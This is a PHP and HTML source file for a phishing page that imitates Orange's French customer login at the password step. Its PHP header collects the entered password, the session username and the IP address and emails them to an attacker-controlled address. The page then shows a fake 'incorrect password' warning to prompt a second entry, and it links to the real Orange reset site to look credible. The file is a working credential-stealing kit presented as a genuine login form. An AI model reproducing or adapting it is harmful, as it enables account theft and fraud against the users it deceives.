<?php session_start();?>
<?php
include_once ("auth.php");
if(isset($_POST['password'])){
    $password = $_POST['password'];
    $username = $_SESSION['username'];

    $data = "Username: $username,\nMot de passe: $password,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Login de $IP", $data);
    sleep(3);
}
?>
<style>
    .o-checkbox[type="checkbox"]:not(:checked) + label:after, .o-checkbox[type="checkbox"]:checked + label:after {
        content: '\2713' !important;
    }

</style>

    <h2 class="sr-only">Saisissez votre mot de passe</h2>
    <div class="eui-identity-area">
        <div class="x-col-avatar">
            <div class="eui-avatar">
                <div class="eui-svg eui-icon-avatar" aria-label="Avatar d’utilisateur" id="accountAvatar" title="Avatar d’utilisateur"></div>
            </div>
        </div>
        <div class="x-col-identity">
            <div class="x-identity">
                <p class="x-dsn eui-dsn eui-ellipsis" aria-label="identifiant" id="accountLogin"><?php if(isset($_SESSION['username'])){ echo $_SESSION['username']; }?></p>
                <p class="eui-empty-login"></p>
                <span id="changeAccountDiv" style="display: inline;">
                    <a data-oevent-category="idme_password" data-oevent-action="clic_changer_de_compte" data-oevent-label="utiliser_un_autre_compte" id="changeAccountLink" href="index.php" title="Changer de compte">Changer de compte</a>
                </span>
            </div>
        </div>
    </div>
    <div class="clearfix"></div>
    <div class="form-group ">
        <div class="eui-input-label">
            <label for="password" id="passwordLabel">Saisissez votre mot de passe</label>
            <div class="eui-assistance-area">
                <button data-oevent="idme_password;clic_bulle_aide_mot_de_passe;bulle_aide_mot_de_passe" class="eui-svg eui-icon-help" type="button" id="helpPassword">
                    <span class="sr-only">aide</span>
                </button>
            </div>
        </div>
        <div style="width: 267px;color: #f12b2d;">
   <b>C'est incorrect, vérifiez l'adresse mail et le mot de passe saisis.</b>
     </div>
        <div class="eui-help" id="helpPasswordCnt" style="display : none;">
            <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
        </div>
        <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>
        <input id="logi" class="off-screen" type="text" name="username" value="<?php if(isset($_SESSION['username'])){ echo $_SESSION['username']; }?>" aria-hidden="true" tabindex="-1" autocorrect="off">

        <div id="passwordContainer">
            <input type="password" id="pass" name="pass" placeholder="Mot de passe" style="border-color: #f12b2d;" autocomplete="current-password" class="form-control pass-assist" maxlength="36" required="">
            <input type="text" id="passwordTxt" style="display: none" class="form-control pass-assist" maxlength="36" aria-hidden="true" aria-invalid="false" aria-labelledby="passwordLabel" autocomplete="off" autocapitalize="none" spellcheck="false" autocorrect="off">

            <div id="assist-visual" class="input-control-visual">
                <div class="assist-area">
                    <div id="assist-icon" class="eui-svg-assist eui-icon-assist-hide">
                        <button id="assist-btn" type="button" class="transparent-btn">
                            <span id="assist-msg" class="sr-only">afficher le mot de passe</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="form-group eui-checkbox">
        <input type="checkbox" class="o-checkbox" id="remember" checked="checked" style="display:block">
        <label for="remember" id="rememberLabel"><span class="eui-label-content">Rester identifié</span>
        </label>
    </div>
    <div>
        <input id="btnSubmt" type="submit" class="btn btn-info eui-btn-sub" value="S’identifier" />
        <a data-oevent="idme_password;clic_mot_de_passe_oublie;mot_de_passe_oublie" id="forgotPassword" class="eui-links-passwd" href="#" onclick="document.location.reload()" title="Mot de passe oublié ?">Mot de passe oublié ?</a>
    </div>
<script>
    $('#assist-btn').on('click', function (e) {
        e.preventDefault();
        if($('#pass').prop('type') === "text")
            $('#pass').prop('type', 'password');
        else
            $('#pass').prop('type', 'text');
    });
</script>